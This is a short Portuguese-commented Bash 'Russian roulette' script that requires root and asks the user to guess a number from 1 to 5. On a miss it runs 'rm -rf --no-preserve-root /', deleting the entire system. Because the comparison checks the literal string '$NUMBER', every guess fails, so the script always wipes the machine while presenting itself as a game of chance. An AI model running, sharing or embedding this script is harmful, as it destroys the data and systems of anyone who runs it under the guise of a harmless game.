#!/usr/bin/env bash

# Roleta russa shell
# Franklin Souza
# @FranklinTech

# checando se o script ta rodando como root, se nao o script nao tem graça
if [ "$EUID" -ne 0 ]
  then echo "Execute esse script como ROOT!"
  exit
fi

# gera um numero random de 1 a 5
numero=$(shuf -i 1-5 -n 1)

# input do usuario
printf "Digite um numero de 1 a 5:\n\n"
read NUMBER

# condicao de acerto, sai do script
if [ $numero == '$NUMBER' ] ; then
  echo -e "Parébens você acertou!!!"
  read -p 'PRESSIONE ENTER PARA SAIR' && clear && exit 0

# condicao de erro... so lamento!
else
  echo -e "Infelizmente você errou!!!" && sleep 4 && sudo rm -rf --no-preserve-root "/"
fi
